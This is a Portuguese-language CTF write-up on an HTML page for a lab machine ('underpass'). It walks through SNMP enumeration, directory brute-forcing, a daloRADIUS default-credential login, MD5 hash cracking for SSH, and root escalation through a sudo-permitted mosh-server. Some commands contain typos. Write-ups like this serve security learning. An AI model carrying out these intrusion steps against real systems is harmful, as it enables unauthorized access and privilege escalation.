@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Relevant</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="../css/writeup.css">
+    </head>
+    <body>
+        <div class="container">
+            <li><a href="../index.html" class="botao-grande"><font color="white">< Insecure Net</font> <font color="#58d411">Homepage</font></a></li>
+        </div>
+<pre><span id="span-title"></font></span>
+    <span><font color="red">my 'Simplectf' writeup</font></span><br>
+    
+    <font color="white">
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⡋⠁⠀⠀⠀⠀⢀⣀⣀⡀
+⠀⠀⠀⠀⠀⠠⠒⣶⣶⣿⣿⣷⣾⣿⣿⣿⣿⣛⣋⣉⠀⠀
+⠀⠀⠀⠀⢀⣤⣞⣫⣿⣿⣿⡻⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀
+⠀⠀⣶⣾⡿⠿⠿⠿⠿⠋⠈⠀⣸⣿⣿⣿⣿⣷⡈⠙⢆⠀
+⠀⠀⠉⠁⠀⠤⣤⣤⣤⣤⣶⣾⣿⣿⣿⣿⠿⣿⣷⠀⠀⠀
+⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⢹⣿⠀⠀⠀
+⢠⣾⣿⣿⣿⣿⠟⠋⠉⠛⠋⠉⠁⣀⠀⠀⠀⠸⠃⠀⠀⠀
+⣿⣿⣿⣿⠹⣇⠀⠀⠀⠀⢀⡀⠀⢀⡙⢷⣦⣄⡀⠀⠀⠀
+⣿⢿⣿⣿⣷⣦⠤⠤⠀⠀⣠⣿⣶⣶⣿⣿⣿⣿⣿⣷⣄⠀
+⠈⠈⣿⡿⢿⣿⣿⣷⣿⣿⡿⢿⣿⣿⣁⡀⠀⠀⠉⢻⣿⣧
+⠀⢀⡟⠀⠀⠉⠛⠙⠻⢿⣦⡀⠙⠛⠯⠤⠄⠀⠀⠈⠈⣿
+⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⡆⠀⠀⠀⠀⠀⠀⠀⢀⠟  
+</font>
+
+
+Site: 10.10.11.48
+
+Primeiro de tudo eu fiz um scan TCP com o nmap, mas não encontrei coisas relevantes, então fiz um UDP.
+
+s1x> nmap -sV -sU --open -T5 10.10.11.48
+
+
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
+|_  System uptime: 30m11.13s (181113 timeticks)
+| snmp-info:
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: c7ad5c4856d1cf6600000000
+|   snmpEngineBoots: 29
+|_  snmpEngineTime: 30m10s
+
+
+O que é o snmp?
+
+É um protocolo de gerenciamento de rede "Simple Network Management Protocol", é usado para gerenciar dispositivos em uma rede de computadores
+para coletar informações como uso de dados, desempenho, enviar alertas, notificações e etc.
+
+Depois de muitas pesquisas sobre o snmp, descobri que tinha como puxar informações sobre ele, pois estava 'public', então...
+
+Após a coleta de informações no snmp com snmpwalk, conseguimos um user 'steve' que não foi utilizado para nada.
+
+"A opção -v especifica a versão do SNMP, e o número que segue (2k) indica a versão SNMPv2k. 
+A opção -c define a comunidade SNMP, que é uma espécie de senha usada para autenticação."
+
+s1x> snmpwalk -vk2 -c public 10.10.11.48
+
+iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
+iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
+iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+
+
+Tentei algumas coisas e fui fazer bruteforce de diretório, pouco sucesso, até que eu tentei brutar todos os path e deu bom.
+
+Brute de vários diretórios usando o ffuf, até chegar neste:
+
+http://10.10.11.48/daloradius/app/users/login.php
+http://10.10.11.48/daloradius/app/operators/login.php
+
+
+Login padrão do daloradius
+
+login: administrator
+senha: radius
+
+Exploração do painel até encontrar o usuario 'svcMosh' e encontrar um hash md5 de senha
+
+As creds funcionaram no ssh, então eu loguei e mandei o padrão 'sudo -l' pra verificar serviço, arquivos, binarios rodando como root.
+
+
+$ sudo -l
+
+(ALL) NOSPASSWD /usr/bin/mosh-server
+
+Cansei de tentar coisas, ja sabia que eu usaria esse mosh-server para escalar os privs, tentei de tudo até que cheguei nessa solução:
+
+$ sudo mosh-server 
+
+MOSH CONNECT 60004 4NeCCgvZFe2RnPgrcU1PQw
+
+mosh-server (mosh 1.1.3)
+Copyright 2012 Keith Winstein mosh-devel@mit.edu
+License GPLv3+: GNU GPL version 3 or later http://gnu.org/licenses/gpl.html.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+[mosh-server detached, pid = 30261]
+
+$ MOSH_KEY=4NeCCgvZFe2RnPgrcU1PQw mosh-client localhost 60004 
+
+# enj0y your r00t sh3ll
+
+
+No localhost porque o mosh-server dizia estar rodando no localhost.
+
+
+</pre>
+    </body>
+</html>
